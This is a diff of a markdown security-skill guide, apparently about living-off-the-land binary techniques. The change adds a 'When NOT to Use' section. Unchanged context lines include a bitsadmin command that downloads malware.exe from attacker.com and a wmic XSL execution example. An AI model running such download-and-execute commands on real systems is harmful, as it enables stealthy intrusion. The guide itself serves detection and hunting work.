@@ -164,6 +164,16 @@ tags:
 6. **BITS Transfer**: `bitsadmin /transfer job /download /priority high http://attacker.com/malware.exe C:\Temp\update.exe` using BITS service for stealthy file download.
 7. **WMIC XSL Execution**: `wmic process list /format:evil.xsl` executing JScript/VBScript from XSL stylesheets.
 
+## When NOT to Use
+
+- You're responding to a known incident (use IR skills)
+- Task is about analyzing confirmed malware (use analyzing-* skills)
+- You need to implement detection rules (use implementing-* skills)
+- Task is about vulnerability scanning (use scanning tools)
+- You don't have access to endpoint/network data
+- Task requires compliance auditing (use auditing-* skills)
+
+
 ## Red Flags
 
 - Performing actions without explicit written authorization from the asset owner
